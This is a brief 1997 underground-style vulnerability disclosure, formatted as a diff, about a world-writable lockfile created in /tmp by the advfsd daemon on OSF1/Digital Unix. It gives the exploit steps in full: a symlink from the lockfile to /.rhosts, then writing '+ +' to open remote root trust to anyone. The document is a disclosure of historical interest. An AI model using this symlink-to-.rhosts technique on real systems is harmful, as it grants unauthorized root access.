@@ -1,0 +1,45 @@
+
+                         .LoW  _  _
+                     |\  | _ |(_`|_'
+                     |  \|(_)|,_)|_.
+               ==========================
+
+H0l4. So here it is another bug for Digital
+
+System: OSF1 my.narco-goverment.sucks.co V4.0 464 alpha
+
+Program: fstab - Static information about file systems and swap partitions
+         advfsd - Starts the AdvFS graphical user interface daemon
+
+Problemo: It creates a lockfile in tmp with nice permitions :)
+
+   /tmp>ls -la
+
+   (Blah Blah Blah.....)
+
+   -rw-rw-rw-   1 root     system    0 Nov xx 15:49 fstab.advfsd.lockfile
+
+What the hell to do with it:
+
+   Before it creates
+
+   ln -s /.rhosts /tmp/fstab.advfsd.lockfile
+
+   from here... cat "+ +" > /tmp/fstab.advfsd.lockfile , etc etc.
+
+if u like to cut:
+------------------------- Cut here --------------------
+
+------------------------- and here --------------------
+
+                     The End - El Fin
+
+                      Colombia 1997.
+
+                         .LoW  _  _
+                     |\  | _ |(_`|_'
+                     |  \|(_)|,_)|_.
+
+                   Efrain 'ET' Torres
+
+----------------------------------------------------------------------------
